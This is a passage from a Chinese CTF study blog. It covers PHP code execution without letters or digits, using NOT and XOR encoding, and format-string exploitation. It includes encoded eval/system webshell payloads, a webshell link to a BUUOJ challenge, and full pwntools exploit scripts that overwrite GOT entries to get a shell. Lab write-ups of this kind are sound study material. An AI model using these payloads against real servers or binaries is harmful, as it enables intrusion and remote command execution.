<h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><p>因为取反后的结果有不可见字符，故需对其进行<code>url</code>编码，而<code>_GET</code>传参会对<code>url</code>编码的内容进行解码。</p>
<h3 id="法一-1"><a href="#法一-1" class="headerlink" title="法一"></a>法一</h3><p>对<code>_POST</code>进行取反并<code>url</code>编码，在解码取反得到。由于这部分要与<code>assert()</code>一起利用，故<code>(eval($_POST[_]))</code>这里外层加上了括号。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;_POST&#x27;</span>);   <span class="comment">#%A0%AF%B0%AC%AB</span></span><br><span class="line"><span class="keyword">echo</span> ~<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%A0%AF%B0%AC%AB&#x27;</span>);</span><br><span class="line"></span><br><span class="line">(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%D7%<span class="number">93</span>%<span class="number">8</span>C%D6);</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>构造<code>eval($_POST[_]);</code></p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"># assert  %9E%8C%8C%9A%8D%8B</span><br><span class="line"># (<span class="keyword">eval</span>($_POST[_]))  %D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%A0%A2%D6%D6</span><br><span class="line"># (~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%A0%A2%D6%D6);</span><br><span class="line">#即 (assert)((<span class="keyword">eval</span>($_POST[_])));</span><br></pre></td></tr></table></figure>

<p>构造<code>phpinfo();</code></p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="attr"># phpinfo  %8</span>F<span class="meta">%</span><span class="number">97</span><span class="meta">%</span><span class="number">8</span>F<span class="meta">%</span><span class="number">96</span><span class="meta">%</span><span class="number">91</span><span class="meta">%</span><span class="number">99</span><span class="meta">%</span><span class="number">90</span></span><br><span class="line"><span class="attr"># (~%8</span>F<span class="meta">%</span><span class="number">97</span><span class="meta">%</span><span class="number">8</span>F<span class="meta">%</span><span class="number">96</span><span class="meta">%</span><span class="number">91</span><span class="meta">%</span><span class="number">99</span><span class="meta">%</span><span class="number">90</span>)<span class="comment">()</span>;   <span class="attr">#即为 phpinfo();</span></span><br></pre></td></tr></table></figure>

<p>另一种方式构造<code>system($_POST[_])</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span> = ~(%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>);   <span class="comment">#定义变量$_为system</span></span><br><span class="line"><span class="variable">$__</span> = ~(%A0%AF%B0%AC%AB);  <span class="comment">#定义变量$__为_POST</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$$__</span>;   <span class="comment">#定义变量$___为$$__，即为$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);   <span class="comment">#即为 assert($_POST[_]);</span></span><br><span class="line"><span class="comment">#将取反结果代入</span></span><br><span class="line"><span class="comment"># $_ = ~(%8C%86%8C%8B%9A%92);$__ = ~(%A0%AF%B0%AC%AB);$___ = $$__;$_($___[_]);</span></span><br></pre></td></tr></table></figure>

<h3 id="法二-1"><a href="#法二-1" class="headerlink" title="法二"></a>法二</h3><p>这种方法是利用汉字取反构造。</p>
<p>可以通过对<code>&#39;构&#39;&#123;1&#125;</code>进行取反，来构造字符<code>a</code>，而<code>1</code>可以通过<code>&#39;_&#39;==&#39;_&#39;</code>来获得。<code>&#39;_&#39;==&#39;_&#39;</code>结果为真，故返回<code>1</code>，反之<code>&#39;_&#39;==&#39;__&#39;</code>结果为假，返回<code>0</code>。</p>
<p>构造<code>phpinfo();</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=[]==[];</span><br><span class="line"><span class="variable">$__</span>=~可[<span class="variable">$_</span>].~时[<span class="variable">$_</span>].~可[<span class="variable">$_</span>].~新[<span class="variable">$_</span>].~周[<span class="variable">$_</span>].~白[<span class="variable">$_</span>].~向[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>();</span><br></pre></td></tr></table></figure>

<p>构造<code>system($_POST[_]);</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=[]==[];</span><br><span class="line"><span class="variable">$__</span>=~北[<span class="variable">$_</span>].~冲[<span class="variable">$_</span>].~北[<span class="variable">$_</span>].~苏[<span class="variable">$_</span>].~皇[<span class="variable">$_</span>].~和[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$___</span>=~码[<span class="variable">$_</span>].~寸[<span class="variable">$_</span>].~小[<span class="variable">$_</span>].~欠[<span class="variable">$_</span>].~立[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>(<span class="variable">$$___</span>[_]);</span><br></pre></td></tr></table></figure>

<p>寻找对应汉字的脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">finds</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$lst</span> = [<span class="string">&#x27;码&#x27;</span>,<span class="string">&#x27;析&#x27;</span>,<span class="string">&#x27;均&#x27;</span>,<span class="string">&#x27;真&#x27;</span>,<span class="string">&#x27;雨&#x27;</span>,<span class="string">&#x27;随&#x27;</span>,<span class="string">&#x27;白&#x27;</span>,<span class="string">&#x27;明&#x27;</span>,<span class="string">&#x27;时&#x27;</span>,<span class="string">&#x27;新&#x27;</span>,<span class="string">&#x27;效&#x27;</span>,<span class="string">&#x27;政&#x27;</span>,<span class="string">&#x27;品&#x27;</span>,<span class="string">&#x27;和&#x27;</span>,<span class="string">&#x27;周&#x27;</span>,<span class="string">&#x27;向&#x27;</span>,<span class="string">&#x27;可&#x27;</span>,<span class="string">&#x27;现&#x27;</span>,<span class="string">&#x27;南&#x27;</span>,<span class="string">&#x27;北&#x27;</span>,<span class="string">&#x27;苏&#x27;</span>,<span class="string">&#x27;节&#x27;</span>,<span class="string">&#x27;前&#x27;</span>,<span class="string">&#x27;我&#x27;</span>,<span class="string">&#x27;出&#x27;</span>,<span class="string">&#x27;况&#x27;</span>,<span class="string">&#x27;关&#x27;</span>,<span class="string">&#x27;侯&#x27;</span>,<span class="string">&#x27;彤&#x27;</span>,<span class="string">&#x27;开&#x27;</span>,<span class="string">&#x27;以&#x27;</span>,<span class="string">&#x27;事&#x27;</span>,<span class="string">&#x27;年&#x27;</span>,<span class="string">&#x27;中&#x27;</span>,<span class="string">&#x27;工&#x27;</span>,<span class="string">&#x27;越&#x27;</span>,<span class="string">&#x27;资&#x27;</span>,<span class="string">&#x27;质&#x27;</span>,<span class="string">&#x27;法&#x27;</span>,<span class="string">&#x27;粉&#x27;</span>,<span class="string">&#x27;展&#x27;</span>,<span class="string">&#x27;就&#x27;</span>,<span class="string">&#x27;对&#x27;</span>,<span class="string">&#x27;家&#x27;</span>,<span class="string">&#x27;学&#x27;</span>,<span class="string">&#x27;欢&#x27;</span>,<span class="string">&#x27;高&#x27;</span>,<span class="string">&#x27;验&#x27;</span>,<span class="string">&#x27;空&#x27;</span>,<span class="string">&#x27;程&#x27;</span>,<span class="string">&#x27;规&#x27;</span>,<span class="string">&#x27;离&#x27;</span>,<span class="string">&#x27;神&#x27;</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$lst</span>);<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$string</span>[<span class="variable">$i</span>]==~<span class="variable">$lst</span>[<span class="variable">$j</span>][<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$string</span>[<span class="variable">$i</span>].<span class="string">&#x27;:&#x27;</span>.<span class="variable">$lst</span>[<span class="variable">$j</span>].<span class="string">&quot;   &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">finds</span>(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a><code>[SUCTF 2019]EasyWeb</code></h3><p><a href="https://buuoj.cn/challenges#[SUCTF%202019]EasyWeb">SUCTF 2019EasyWeb</a></p>
<p>要绕过如下过滤：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060223347.png" alt="image-20250119103540779" style="zoom:50%;" />

<p>已知<code>_,G,E,T</code>字符可以如下构成</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">_:<span class="meta">%</span><span class="number">86</span>^<span class="meta">%</span>d<span class="number">9</span></span><br><span class="line">G:<span class="meta">%</span><span class="number">86</span>^<span class="meta">%</span>c<span class="number">1</span></span><br><span class="line">E:<span class="meta">%</span><span class="number">86</span>^<span class="meta">%</span>c<span class="number">3</span></span><br><span class="line">T:<span class="meta">%</span><span class="number">86</span>^<span class="meta">%</span>d<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>构造执行<code>phpinfo()</code>的payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[code]);</span><br><span class="line"><span class="comment"># ?code=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo</span></span><br></pre></td></tr></table></figure>

<h3 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a><code>[极客大挑战 2019]RCE ME</code></h3><p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="comment">#限制</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>) <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>)) <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>过滤了大小写字母和数字</p>
<p>先通过phpinfo()测试一下</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"># phpinfo  %8F%97%8F%96%91%99%90</span><br><span class="line"># phpinfo();  (!phpinfo)();</span><br><span class="line">?code = (~%8F%97%8F%96%91%99%90)();</span><br><span class="line">#(assert)((<span class="keyword">eval</span>($_POST[shell])));</span><br><span class="line">?code = (~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6%D6);</span><br></pre></td></tr></table></figure>

<p><code>%8F%97%8F%96%91%99%90</code>是什么呢？是由字符串<code>phpinfo</code>先取反再进行<code>url</code>编码所得到的一串编码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$p</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;assert&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;(eval($_POST[shell]))&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment"># %8F%97%8F%96%91%99%90</span></span><br><span class="line">    <span class="comment">#%9E%8C%8C%9A%8D%8B</span></span><br><span class="line">	<span class="comment">#%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6%D6</span></span><br></pre></td></tr></table></figure>

<p><strong>解题：</strong></p>
<p>传入参数<code>?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6%D6);</code></p>
<p>蚁剑连接<code>http://81ee6069-0856-4349-b89f-342253bbe6eb.node5.buuoj.cn:81/?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6%D6);</code></p>
<h4 id="绕过diasble-functions"><a href="#绕过diasble-functions" class="headerlink" title="绕过diasble_functions"></a>绕过<code>diasble_functions</code></h4><p>然后选择绕过<code>diasble_functions</code>插件</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060223549.png" alt="image-20241103225407335" style="zoom:50%;" />

<p>选择模式，<code>PHP7_GC_UAF</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060224964.png" alt="image-20241103225445065" style="zoom:50%;" />

<p>在命令行界面中执行<code>/readflag</code>，得到<code>flag</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060224985.png" alt="image-20241103225639279" style="zoom:67%;" />

<h3 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a><code>[SUCTF 2018]GetShell</code></h3><p><a href="https://buuoj.cn/challenges#[SUCTF%202018]GetShell">SUCTF 2018 GetShell</a></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060223534.png" alt="image-20250120154828228" style="zoom: 50%;" />

<p>上传一个文件，会对文件中从第五个字符及以后依次检查，该过滤的都过滤完了，就只剩下<code>$ ~ [] _ () ; .</code>这些字符没有被过滤，这里利用一种汉字取反的方法。</p>
<p>构造<code>system($_POST[_]);</code>，并上传</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[]==[];</span><br><span class="line"><span class="variable">$__</span>=~北[<span class="variable">$_</span>].~冲[<span class="variable">$_</span>].~北[<span class="variable">$_</span>].~苏[<span class="variable">$_</span>].~皇[<span class="variable">$_</span>].~和[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$___</span>=~码[<span class="variable">$_</span>].~寸[<span class="variable">$_</span>].~小[<span class="variable">$_</span>].~欠[<span class="variable">$_</span>].~立[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>(<span class="variable">$$___</span>[_]);</span><br></pre></td></tr></table></figure>

<p><code>buu</code>环境原因，只能在环境变量中查看flag，<code>system(&#39;env&#39;)</code>查看系统中的环境变量。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060224304.png" alt="image-20250120155728131"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://arsenetang.github.io/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/#2-%E5%8F%96%E5%8F%8D">RCE篇之无数字字母rce</a></p>
<p><a href="https://blog.csdn.net/qq_61778128/article/details/127063407">无数字字母rce总结（取反、异或、自增、临时文件）-CSDN博客</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串漏洞学习总结</title>
    <url>/2024/01/29/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="printf中的格式控制符"><a href="#printf中的格式控制符" class="headerlink" title="printf中的格式控制符"></a><code>printf</code>中的格式控制符</h2><p>​	格式控制符告诉函数如何解析和处理传递给它们的参数。如果<code>printf</code>中的格式控制符没有对应的参数，那么将会泄漏内存中的数据。一个<code>%</code>可以解析一个参数，也就是对应一个参数。</p>
<span id="more"></span>

<ul>
<li><p><code>%c</code>：以字符形式输出</p>
</li>
<li><p><code>%d</code>：以十进制整数形式输出</p>
</li>
<li><p><code>%x</code>：以十六进制形式输出，<code>%7$x</code>表示输出参数列表中的第七个参数</p>
</li>
<li><p><code>%p</code>：以十六进制形式输出，并加上前缀<code>0x</code></p>
</li>
<li><p><code>%n</code>：将<code>%n</code>之前<code>printf</code>已经打印的字符个数赋值给偏移处指针所指向的地址位置。</p>
<ul>
<li><code>%n</code>：写入的地址空间为<code>4</code>个字节</li>
<li><code>%hn</code>：写入的地址空间为<code>2</code>个字节</li>
<li><code>%hhn</code>：写入的地址空间为<code>1</code>个字节</li>
<li><code>%lln</code>：写入的地址空间为<code>8</code>个字节</li>
</ul>
</li>
</ul>
<h2 id="pwntools中的fmtstr-paylod"><a href="#pwntools中的fmtstr-paylod" class="headerlink" title="pwntools中的fmtstr_paylod"></a><code>pwntools</code>中的<code>fmtstr_paylod</code></h2><p>​	<code>fmtstr_payload</code>是<code>pwntools</code>中的一个函数，其函数原型如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset,writes,numbwritten,write_size)</span><br><span class="line"><span class="comment">#offset是格式化字符串漏洞的偏移量</span></span><br><span class="line"><span class="comment">#writes是一个字典，用于指定要写入的值和地址，结构如下</span></span><br><span class="line">write=&#123;</span><br><span class="line">    addr_1:value_1,</span><br><span class="line">	addr_2:value_2,</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#numbwritten参数表示前面已经写入的字节数</span></span><br><span class="line"><span class="comment">#write_size参数表示写入的字节大小，默认为&#x27;byte&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="非栈上的格式化字符串漏洞"><a href="#非栈上的格式化字符串漏洞" class="headerlink" title="非栈上的格式化字符串漏洞"></a>非栈上的格式化字符串漏洞</h2><p>​	我们通常所说的在栈上的格式化字符串漏洞的意思就是我们可以直接把数据写到栈上，然后对栈上的数据进行一系列的攻击。如<code>A</code>是栈上的一个地址，<code>B</code>是我们要写到<code>A</code>里的<code>printf</code>的<code>got</code>表值，那么现在就是<code>A -&gt; B -&gt; C</code>，<code>C</code>是<code>printf</code>函数的<code>plt</code>表值。然后我们可以修改<code>B</code>这个地址中的内容即<code>C</code>，改成后门函数的地址。而非栈上的格式化字符串漏洞就是我们不能直接把<code>B</code>写到栈上，但是依然可以泄漏和修改栈中的地址等数据。如果我们不能直接把<code>B</code>写到栈上，我们可以先在栈上找到<code>D -&gt; E -&gt; F</code>把<code>F</code>修改成<code>B</code>就变成了<code>D -&gt; E -&gt; B</code>，但是我们最后的目的是修改<code>B</code>指向的地址，所以说这里的<code>E</code>必须是与<code>A</code>和<code>D</code>一样的栈地址，那么<code>E -&gt; F</code>就变成了<code>E -&gt; B -&gt; C</code>，又回到了栈上。</p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a><code>jarvisoj_fm</code></h2><p>​	先看主函数，直接给我们<code>system(&quot;/bin/sh&quot;)</code>，当<code>x == 4</code>的时候才能执行这个函数。我们看到第<code>10</code>行有个<code>printf(buf)</code>再结合第<code>9</code>行，不难知道这是一个格式化字符串漏洞。那我们就可以利用这个漏洞把<code>x</code>写成<code>4</code>，就可以拿到<code>shell</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181930905.png" alt="image-20240131182232759"></p>
<p>​	先计算偏移量，偏移量为<code>11</code>，然后构造<code>payload</code>。我们要写入的内容是<code>4</code>，巧的是我们要写入的地址也是<code>4</code>个字节，所以我们直接发送地址就可以写了，<code>payload = p32(value_addr)+b&#39;%11$n&#39;</code>。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">p = process(<span class="string">&#x27;./fm&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">value_addr = <span class="number">0x0804a02c</span></span><br><span class="line">payload = p32(value_addr)+<span class="string">b&#x27;%11$n&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a><code>axb_2019_fmt32</code></h2><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931380.png" alt="image-20240129124847881"></p>
<p>​	我们看到<code>read</code>函数，可以读入<code>0x100(256)</code>个字节，而<code>s</code>的长度为<code>257</code>，因此没有办法溢出。继续往下看，<code>printf(format)</code>这一行明显存在格式化字符串漏洞，程序中也没有<code>system</code>函数和<code>/bin/sh</code>字符串。那大概思路就是利用格式化字符串漏洞泄漏<code>printf</code>的地址（本来我想修改<code>read</code>的<code>got</code>表值的，但是后来才相等修改后就相当于程序中没有<code>read</code>函数了，这样肯定是不行的），算出<code>libc</code>基地址以及<code>system</code>函数地址。</p>
<p>​	怎么泄漏<code>printf</code>的地址呢？本题中我们通过<code>read</code>函数将输入的内容写到<code>s</code>中，而<code>s</code>又是<code>printf</code>函数的参数，因此我们可以利用格式化字符串漏洞去泄漏栈上的内容，因此可以先把<code>printf</code>在<code>got</code>表中值写到栈上，再去泄漏程序运行起来后<code>printf</code>在<code>got</code>表中的地址即<code>printf</code>的真实地址。这就需要计算我们写入的内容在栈上的位置的偏移量，输入<code>aaaa %p %p %p %p %p %p %p %p %p %p %p</code>得到输出的内容数一下偏移量为<code>8</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931580.png" alt="image-20240129132814049"></p>
<p>​	不过我们也发现了<code>0x20616161</code>中只有<code>3</code>个<code>a</code>，是因为<code>format</code>中还有<code>Repeater:</code>这些字符的原因，所以我们尝试着再输入<code>Aaaaa %p %p %p %p %p %p %p %p</code>，发现<code>0x61616161</code>刚好就是<code>aaaa</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931608.png" alt="image-20240129140029043"></p>
<p>​	得到偏移量后可以开始构造第一个<code>payload</code>泄漏<code>printf</code>地址了，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>+p32(printf_got)+<span class="string">b&#x27;bbbb&#x27;</span>+<span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_addr))</span><br></pre></td></tr></table></figure>

<p>​	得到<code>printf</code>真实地址后，可以计算<code>libc</code>基地址以及<code>system</code>函数的地址，并把<code>printf</code>的<code>got</code>表值改成<code>system</code>函数的地址，这样再次传入参数 <code>&#39;/bin/sh&#39;</code> 再执行<code>printf</code>时，由于将<code>got</code>表给修改了，就相当于执行了<code>system</code> 函数 即：执行<code>system(&#39;/bin/sh&#39;)</code>。这也解释了为什么刚开始我改<code>puts</code>函数的<code>got</code>表不行，因为就算把<code>puts</code>的<code>got</code>表的值改成<code>system</code>函数的<code>got</code>表值，我们后面也不会再执行<code>puts</code>函数，也就执行不了<code>system</code>函数。</p>
<h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>​	题目如果是<code>32</code>位的程序，可以用<code>pwntools</code>中的<code>fmtstr_payload</code>函数直接修改地址，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">base_addr = printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>+fmtstr_payload(<span class="number">8</span>,&#123;printf_got:sys_addr&#125;,numbwritten=<span class="number">0xa</span>,write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><code>exp</code></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./axb&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26252</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./axb&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>+p32(printf_got)+<span class="string">b&#x27;bbbb&#x27;</span>+<span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#print(hex(printf_addr))</span></span><br><span class="line"></span><br><span class="line">base_addr = printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>+fmtstr_payload(<span class="number">8</span>,&#123;printf_got:sys_addr&#125;,numbwritten=<span class="number">0xa</span>,write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931998.png" alt="image-20240129144017329"></p>
<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>一个字节一个字节的修改，这个方法对<code>32</code>位和<code>64</code>位的都适用。</p>
<p>​	先把两个地址打印出来，发现四个字节中只有最高字节<code>f7</code>是一样的，我们们需要修改后<code>3</code>个字节，也就是需要这样修改<code>e3 --&gt; e2</code>，<code>10 --&gt; 29</code>，<code>20 --&gt; 40</code>（当然地址是不确定的，肯定不能直接改数字）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;printf_addr =&gt;&#x27;</span>,<span class="built_in">hex</span>(printf_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931794.png" alt="image-20240130161627843"></p>
<p>​	虽然每次地址都会变化，但是我们可以把每次的地址表示出来。<code>sys_addr&amp;0xff</code>将<code>sys_addr</code>与<code>0xff</code>进行按位与运算，得到的结果把<code>sys_addr</code>的低<code>8</code>位（<code>8</code>位<code>1</code>个字节）保留下来了，高位被全部置零。<code>sys_addr&amp;0xff00</code>将<code>sys_addr</code>二进制形式的第<code>9</code>到<code>16</code>位保存下来了，其他位全部置零举个例子就是<code>11111111 11111111 11111111</code>变成了<code>00000000 11111111 00000000</code>。<code>&gt;&gt;8</code>是再将结果右移<code>8</code>位即<code>00000000 11111111 00000000</code>变成了<code>00000000 11111111</code>。<code>(sys_addr&amp;0xff00)&gt;&gt;8</code>就是把<code>sys_addr</code>的倒数第二个字节保留下来了。</p>
